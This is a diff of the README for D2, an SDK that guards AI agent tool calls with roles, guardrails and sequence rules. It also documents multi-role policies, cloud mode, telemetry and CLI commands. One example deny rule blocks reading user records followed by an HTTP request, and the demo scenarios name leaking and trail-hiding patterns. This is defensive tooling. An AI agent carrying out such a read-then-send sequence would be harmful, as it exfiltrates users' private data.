+**Runtime performance:** O(1) set membership check per tool (fast regardless of group size)
+
+### Try it
+
+Run the demo to see it in action:
+
+```bash
+python examples/sequence_demo.py
+```
+
+It shows 5 scenarios:
+
+1. Direct leak (blocked)
+2. Safe internal workflow (allowed)
+3. Hiding the trail (blocked)
+4. Secrets leak (blocked)
+5. Admin bypass (allowed)
+
+For complete protection, combine RBAC, sequence enforcement, and input/output guardrails. See the Trail of Bits research linked above for more attack patterns.
+
+---
+
+## Multi-role policies (version 1.1+)
+
+**What it does:** Multiple roles can share the same permissions, guardrails, and sequence rules in one policy block.
+
+### The problem
+
+When organizations have role tiers (analyst, senior_analyst, lead_analyst) or equivalent positions (data_engineer, ml_engineer, backend_engineer), traditional policies need the same rules copied for each role:
+
+```yaml
+# Old way: Copy everything
+policies:
+  - role: analyst
+    permissions:
+      - tool: database.read_users
+        conditions: { ... }
+    sequence: [ ... ]
+  
+  - role: senior_analyst
+    permissions:
+      - tool: database.read_users
+        conditions: { ... }  # Same rules copied
+    sequence: [ ... ]       # Same rules copied
+```
+
+This causes problems:
+
+- Policy drift when you update one role but forget the others
+- Hard to maintain as you add more roles
+- Unclear if roles are actually supposed to be the same
+
+### The solution
+
+Use multi-role syntax to define rules once for multiple roles:
+
+```yaml
+# New way: Define once, apply to all
+policies:
+  # All analyst roles share these rules
+  - role: ["analyst", "senior_analyst", "lead_analyst"]
+    permissions:
+      - tool: database.read_users
+        allow: true
+        conditions:
+          output:
+            ssn: {action: filter}
+            salary: {action: filter}
+    
+    sequence:
+      - deny: ["database.read_users", "web.http_request"]
+        reason: "Prevent PII leaks"
+```
+
+### Syntax options
+
+Three ways to write multi-role policies:
+
+```yaml
+# 1. Single role (works like before)
+- role: "admin"
+  permissions: ["*"]
+
+# 2. Multiple roles (list with 'role' key)
+- role: ["analyst", "senior_analyst", "lead_analyst"]
+  permissions: [ ... ]
+
+# 3. Alternative key (if you prefer 'roles' plural)
+- roles: ["contractor", "intern", "guest"]
+  permissions: [ ... ]
+```
+
+### What you get
+
+- DRY principle: Write once, apply to multiple roles
+- Easier updates: Change one block, all roles update
+- Clear intent: Shows which roles are equivalent
+- Works everywhere: RBAC, guardrails, and sequences all support it
+- Backwards compatible: Old single-role syntax still works
+
+### Common use cases
+
+1. **Role tiers:** `["analyst", "senior_analyst", "lead_analyst"]` - Same access, different seniority levels
+2. **Engineering teams:** `["data_engineer", "ml_engineer", "backend_engineer"]` - Equivalent technical roles
+3. **Limited access:** `["contractor", "intern", "guest"]` - Restricted permissions for temporary users
+4. **Service accounts:** `["integration_service_prod", "integration_service_staging", "integration_service_dev"]` - Same rules across environments
+
+### Try it
+
+See it in action:
+
+```bash
+python examples/multi_role_demo.py
+```
+
+Shows:
+
+- Multiple analyst roles sharing output sanitization
+- Engineering teams with shared sequence enforcement
+- Limited-access users with the same restrictions
+- Service accounts with consistent permissions across environments
+
+Check out `examples/multi_role_policy.yaml` for a complete policy example.
+
+---
+
+## Creating and iterating on policies locally
+
+Create a local policy without needing a cloud account:
 
 ```bash
 python -m d2 init --path ./your_project
 ```
 
-This scans your code for `@d2_guard` and writes a starter policy to:
+This scans your code for `@d2_guard` and creates a starter policy at:
+
 - `${XDG_CONFIG_HOME:-~/.config}/d2/policy.yaml` by default
 
-The SDK discovers the policy in this order:
-1) `D2_POLICY_FILE` (explicit path)
-2) `~/.config/d2/policy.yaml` (or XDG)
-3) `./policy.yaml|.yml|.json` (CWD)
+The SDK looks for policies in this order:
 
-Example policy
+1. `D2_POLICY_FILE` (explicit path you set)
+2. `~/.config/d2/policy.yaml` (or XDG config directory)
+3. `./policy.yaml` or `.yml` or `.json` (current directory)
+
+**Example policy:**
+
 ```yaml
 metadata:
   name: "your-app-name"
-  description: "Optional human description"
+  description: "Optional description"
   expires: "2025-12-01T00:00:00+00:00"
 policies:
   - role: admin
@@ -324,205 +968,182 @@ policies:
       - "analytics:run"
 ```
 
-Try it
+**Using it in code:**
+
 ```python
 from d2.exceptions import PermissionDeniedError
 
 try:
     read_billing()
 except PermissionDeniedError:
-    ...  # map to HTTP 403, return fallback, etc.
+    # Handle it: return HTTP 403, use fallback, etc.
+    ...
 ```
 
 ---
 
-## ☁️ Move to cloud when ready
+## Moving to cloud mode
 
-Add your token and keep the same code:
+When you're ready, add your token and keep the same code:
 
 ```bash
 export D2_TOKEN=d2_...
 ```
 
-### Continue: Cloud mode details
+**Setup is the same:**
 
 ```python
-await d2.configure_rbac_async()  # same call as local mode
+await d2.configure_rbac_async()  # Same call as local mode
 ```
 
-- The SDK polls `/v1/policy/bundle` (ETag-aware)
-- Instant revocation/versioning; quotas & metrics
-  - JWKS rotation is automatic: the control plane can signal a refresh via token headers and the SDK refreshes keys transparently
-  - Plan/app limits surfaced clearly: `402` → `D2PlanLimitError`; `403` with `detail: quota_apps_exceeded` → upgrade or delete unused apps
+**What happens:**
 
-Publish (signed) from CLI:
-```bash
-python -m d2 publish ./policy.yaml  # auto-generates key & signs
-```
+- The SDK polls `/v1/policy/bundle` with ETag support for efficient caching
+- You get instant revocation, versioning, quotas, and metrics
+- JWKS rotation is automatic (the server tells the SDK when to refresh keys)
+- Plan and app limits are shown clearly:
+  - 402 errors become `D2PlanLimitError`
+  - 403 with `detail: quota_apps_exceeded` means you need to upgrade or delete unused apps
 
-Key management
-- Keys are registered automatically on first publish and reused thereafter.
-- Revocation is managed in the dashboard.
-
-Token types (recommended practice)
-- Developer token (scope includes `policy:write`): issued from the dashboard. Use in CI/ops to upload drafts and publish policies via CLI. DO NOT ship this token with your application or devices.
-- Runtime token (read‑only): also issued via the dashboard; deploy with services to fetch/verify policy bundles.
-
-> Note: The SDK does not create tokens. It accepts tokens provisioned via the dashboard (Authorization: Bearer ...).
-
-What does “ETag‑aware” polling mean?
-- The control-plane (d2 cloud) returns an `ETag` header (a policy bundle version fingerprint).
-- The SDK sends `If-None-Match: <etag>` on the next poll; the server replies `304 Not Modified` if nothing changed.
-- This avoids re-downloading the same bundle and reduces load.
-
-Failure behavior
-- If the network or control-plane is unavailable, the SDK keeps using the last good bundle in memory.
-- If no bundle is available or it has expired, D2 fails closed: guarded tools are denied (you’ll see `BundleExpiredError`/`MissingPolicyError` or your `on_deny` fallback).
- - Plan/app limits: publishing/drafting or runtime fetches may fail due to plan limits. Non‑retryable examples:
-   - `402` → surfaced as `D2PlanLimitError` (e.g., tool or feature limit)
-   - `403` with `detail: quota_apps_exceeded` → account has reached the maximum number of apps; upgrade or delete unused apps
-
-## 📊 Telemetry & analytics
-
-D2 pushes useful telemetry without demanding extra wiring:
-
-- **Metrics** land in your OTLP collector (respecting `OTEL_EXPORTER_OTLP_ENDPOINT`). Latency, decision counts, JWKS rotation, polling health—it’s all there.
-- **Usage events** go to the D2 Cloud ingest endpoint whenever `D2_TOKEN` is set. Every event is tagged with tool id, policy etag, service name, and the exact denial reason if there was one.
-- **D2_TELEMETRY modes**
-  - `off` – nothing leaves the process
-  - `metrics` – OTLP only
-  - `usage` – cloud events only
-  - `all` (default) – both; metrics still no-op if the exporter libs aren’t installed
-- Exporter failures never bubble up—worst case we drop the event and keep your app running.
-
-> If/when metrics APIs arrive in the control plane, tokens will need the `metrics.read` scope alongside `admin`.
-
-### Telemetry & privacy
-- Local mode is completely offline. Usage events only flow in Cloud mode.
-- Already configured an OpenTelemetry provider? D2 leaves it alone.
-- User identifiers you pass into `set_user()` appear as-is in denial events. Hash or pseudonymise if that matters for your compliance story.
-- ANSI colour in the CLI is just cosmetic; the library logs plain text.
-
----
-
-## ⚙️ Environment Variables
-
-| Variable | Default | Purpose |
-|----------|---------|---------|
-| `D2_TOKEN` | unset | If set, enables Cloud mode (Bearer for API + usage ingestion). Unset → Local-file mode. |
-| `D2_POLICY_FILE` | auto-discovery | Absolute/relative path to your local policy file (overrides discovery). |
-| `D2_TELEMETRY` | `all` | `off` | `metrics` | `usage` | `all`: controls OTLP metrics and raw usage events. |
-| `D2_JWKS_URL` | derived from API URL | Override JWKS endpoint (rare; Cloud mode usually discovers `/.well-known/jwks.json`). |
-| `D2_STRICT_SYNC` | `0` | When `1` (or truthy), disables auto-threading for sync tools called inside an async loop and fails fast. |
-| `D2_API_URL` | default from code (`DEFAULT_API_URL`, currently `https://d2.artoo.love`) | The base URL for the control plane. |
-| `D2_STATE_PATH` | `~/.config/d2/bundles.json` | Override persisted bundle state path; set to `:memory:` to disable. |
-| `D2_SILENT` | `0` | Suppress local-mode banner and expiry warnings when `1` (truthy). |
-
-All variables listed above are implemented in the SDK as of 1.0.
-
----
-
-## ❓ FAQ / Tips
-
-- What happens if I call a sync tool inside an async context?
-  - D2 auto‑threads the call and returns the real value; no extra code
-  - Advanced: set `D2_STRICT_SYNC=1` or `@d2_guard(..., strict=True)` to fail‑fast for diagnostics
-
-- Where do I put roles?
-  - In your policy. A call is allowed when any user role matches a permission entry (supports `*` wildcard)
-
-- How do I avoid context leaks?
-  - Use `@clear_context` / `@clear_context_async`, or call `clear_user_context()` in `finally`
-  - `d2.warn_if_context_set()` can help detect leaks in tests
-
-- Telemetry
-  - `D2_TELEMETRY=off|metrics|usage|all`
-
----
-
-## 🧰 CLI commands (quick reference)
-
-| Command | Purpose | Common flags |
-|--------|---------|--------------|
-| `d2 init` | Generate a starter local policy to `~/.config/d2/policy.{yaml,json}` (scans for `@d2_guard`) | `--path`, `--format`, `--force` |
-| `d2 pull` | Download cloud bundle to a file (requires `D2_TOKEN`) | `--output`, `--format` |
-| `d2 inspect` | Show permissions/roles (cloud or local) | `--verbose` |
-| `d2 diagnose` | Validate local policy limits (tool count, expiry) |  |
-| `d2 draft` | Upload a policy draft (requires token with `policy:write`) | `--version` |
-| `d2 publish` | Sign & publish policy (requires token with `policy:write` + device key) | `--dry-run`, `--force` |
-| `d2 revoke` | Revoke the latest policy (requires token with appropriate permission) |  |
-
-### Publish details (attestation + preconditions)
-- Authorization: `Bearer $D2_TOKEN` (token must include `policy:write`)
-- Device attestation headers:
-  - `X-D2-Key-Id`: device key id (auto-generated on first publish)
-  - `X-D2-Signature`: base64 Ed25519 over the exact HTTP request body bytes
-- Preconditions (ETag):
-  - `If-Match: "<etag>"` when updating an existing policy
-  - `If-None-Match: *` for first-time publish
-
-### Draft upload
-- Body: `{"version": <int>, "bundle": {...}}`
-- Example: `python -m d2 draft ./policy.yaml --version 7`
- - Errors to surface without retry:
-   - `403` with `detail: quota_apps_exceeded` → plan’s max apps reached (upgrade or delete apps)
-
-### Key management (platform-owned)
-- Keys are registered automatically on first publish and reused thereafter.
-- Revocation is managed in the dashboard; the CLI does not expose key deletion.
-
-### Tokens (dashboard-only)
-- The SDK/CLI do not create tokens. Obtain admin/runtime tokens from the dashboard and supply via `D2_TOKEN`.
-
-### Events ingest
-- SDK sends usage events to `/v1/events/ingest` (chunked to ≤32 KiB per request).
-- On `429`, the SDK respects `Retry-After` before retrying the next chunk.
-- Default payload shape per event: `{event_type, payload, occurred_at}` (wrapped in `{events:[...]}`).
-
----
-
-## 🧪 Development
-
-### Running Tests
-
-The project includes a comprehensive test suite with 79 tests covering all functionality:
+**Publishing from CLI:**
 
 ```bash
-# Install development dependencies
-pip install -e .[dev,test]
-
-# Run all tests
-pytest
-
-# Run tests with coverage
-pytest --cov=d2 --cov-report=html
-
-# Run specific test categories
-pytest tests/test_jwks_rotation.py  # JWKS rotation tests
-pytest tests/test_policy_client.py  # Policy client integration tests
-pytest tests/test_decorator.py      # Decorator functionality tests
+python -m d2 publish ./policy.yaml  # Generates key and signs automatically
 ```
 
-### Test Status
-- **79 tests passing** (100% pass rate)
-- **0 tests failing** 
-- **0 tests skipped**
-- **Fast execution**: < 5 seconds for full suite
+**Key management:**
 
-### Key Test Areas
-- **JWKS rotation and caching**: Automatic key rotation, rate limiting, error handling
-- **JWT structure validation**: Audience claims, policy extraction, signature verification
-- **Policy client integration**: End-to-end workflow testing with callback handling
-- **Policy parsing**: Both cloud (nested) and local (flat) policy structures
-- **Error handling**: Token type detection, network failures, validation errors
-- **Demo integration**: Working examples for both cloud and local modes
+- Keys are registered automatically on first publish and reused after that
+- Revocation happens in the dashboard
 
-### Development Workflow
+**Token types** (recommended practice):
 
-1. **Make changes** to the codebase
-2. **Run tests** to ensure no regressions: `pytest`
-3. **Check linting** if available: `flake8` or similar
-4. **Update documentation** if needed (README.md, EVERYTHING-python.md)
-5. **Verify examples work**: `python examples/local_mode_demo.py`
+- Developer token (includes `policy:write` scope): Get from dashboard. Use in CI/ops to upload drafts and publish policies. Don't ship this with your app.
+- Runtime token (read-only): Also from dashboard. Deploy with services to fetch and verify policy bundles.
+
+The SDK doesn't create tokens. Get them from the dashboard (uses `Authorization: Bearer` format).
+
+**What is ETag-aware polling?**
+
+- The control plane returns an `ETag` header (a version fingerprint for the policy bundle)
+- The SDK sends `If-None-Match: <etag>` on the next request
+- Server responds with `304 Not Modified` if nothing changed
+- This avoids re-downloading the same bundle and reduces load
+
+**Failure behavior:**
+
+- If the network or control plane is down, the SDK keeps using the last good bundle from memory
+- If no bundle is available or it expired, D2 fails closed (tools are blocked and you'll see `BundleExpiredError` or `MissingPolicyError`, or your `on_deny` fallback runs)
+- Plan and app limits: Publishing, drafting, or runtime fetches might fail due to limits:
+  - 402 error becomes `D2PlanLimitError` (hit a tool or feature limit)
+  - 403 with `detail: quota_apps_exceeded` means account is at max apps (need to upgrade or delete apps)
+
+---
+
+## Telemetry and analytics
+
+D2 sends useful telemetry without extra setup:
+
+**Metrics** go to your OTLP collector (respects `OTEL_EXPORTER_OTLP_ENDPOINT`). You get latency, decision counts, JWKS rotation status, polling health, and more.
+
+**Usage events** go to the D2 Cloud ingest endpoint when `D2_TOKEN` is set. Each event includes tool ID, policy etag, service name, and the exact denial reason if there was one.
+
+**Telemetry modes** (set with `D2_TELEMETRY`):
+
+- `off`: Nothing leaves the process
+- `metrics`: OTLP only
+- `usage`: Cloud events only
+- `all` (default): Both (metrics still no-op if exporter libs aren't installed)
+
+Exporter failures never bubble up. Worst case, we drop the event and keep your app running.
+
+If metrics APIs arrive in the control plane later, tokens will need the `metrics.read` scope alongside `admin`.
+
+### Telemetry and privacy
+
+- Local mode is completely offline. Usage events only flow in cloud mode.
+- D2 doesn't change your existing OpenTelemetry setup.
+- User IDs you pass to `set_user()` appear as-is in denial events. Hash or change them if needed for compliance.
+- ANSI color in the CLI is cosmetic. The library logs plain text.
+
+---
+
+## Environment variables reference
+
+| Variable | Default | What it does |
+|----------|---------|--------------|
+| `D2_TOKEN` | Not set | When set, enables cloud mode (uses Bearer auth for API and usage). When not set, uses local file mode. |
+| `D2_POLICY_FILE` | Auto-discovery | Full or relative path to your local policy file (skips auto-discovery). |
+| `D2_TELEMETRY` | `all` | Controls OTLP metrics and raw usage events. Options: `off`, `metrics`, `usage`, `all` |
+| `D2_JWKS_URL` | Derived from API URL | Override JWKS endpoint (rarely needed). Cloud mode usually uses `/.well-known/jwks.json` |
+| `D2_STRICT_SYNC` | `0` | When `1` (or truthy), disables auto-threading for sync tools in async loops. Makes them fail fast instead. |
+| `D2_API_URL` | Default from code | The base URL for the control plane. Currently defaults to `https://d2.artoo.love` |
+| `D2_STATE_PATH` | `~/.config/d2/bundles.json` | Path for cached bundle state. Set to `:memory:` to disable caching. |
+| `D2_SILENT` | `0` | When `1` (or truthy), suppresses the local mode banner and expiry warnings. |
+
+All of these are implemented in version 1.0 and later.
+
+---
+
+## FAQ and tips
+
+**What happens if I call a sync tool from async code?**
+
+D2 auto-threads the call and returns the real value. No extra code needed. For diagnostics, set `D2_STRICT_SYNC=1` or use `@d2_guard(..., strict=True)` to fail fast instead.
+
+**Where do I define roles?**
+
+In your policy file. A call is allowed when any of the user's roles matches a permission entry. Wildcard `*` is supported.
+
+**How do I avoid context leaks?**
+
+Use `@clear_context` or `@clear_context_async` decorators. Or call `clear_user_context()` in a `finally` block. Use `d2.warn_if_context_set()` in tests to detect leaks.
+
+**How do I control telemetry?**
+
+Set `D2_TELEMETRY` to `off`, `metrics`, `usage`, or `all`.
+
+---
+
+## CLI commands reference
+
+| Command | What it does | Useful flags |
+|---------|--------------|--------------|
+| `d2 init` | Create a starter local policy at `~/.config/d2/policy.yaml` (scans for `@d2_guard`) | `--path`, `--format`, `--force` |
+| `d2 pull` | Download cloud bundle to a file (needs `D2_TOKEN`) | `--output`, `--format` |
+| `d2 inspect` | Show permissions and roles (works with cloud or local) | `--verbose` |
+| `d2 diagnose` | Check local policy limits (tool count, expiry date) | |
+| `d2 draft` | Upload a policy draft (needs token with `policy:write`) | `--version` |
+| `d2 publish` | Sign and publish policy (needs token with `policy:write` and device key) | `--dry-run`, `--force` |
+| `d2 revoke` | Revoke the latest policy (needs token with appropriate permission) | |
+
+### Publish details
+
+**Authorization:** Uses `Bearer $D2_TOKEN` (token needs `policy:write` scope)
+
+
+### Key management
+
+Keys are registered automatically on first publish and reused after that. Revocation happens in the dashboard. The CLI doesn't expose key deletion.
+
+### Tokens
+
+The SDK and CLI don't create tokens. Get admin and runtime tokens from the dashboard and supply via `D2_TOKEN`.
+
+
+---
+
+## Development
+
+
+
+### Development workflow
+
+D2 follows a test driven development workflow:
+1. Write test cases for what you expect as a result of your new function/feature you're introducing
+2. Make changes to the code
+3. Run pytest to observe if you have regressions and to see if your unit tests pass as expected
+4. Update docs if needed (README.md, EVERYTHING-python.md)
+5. Make sure examples work: `python examples/local_mode_demo.py`
 
 ---
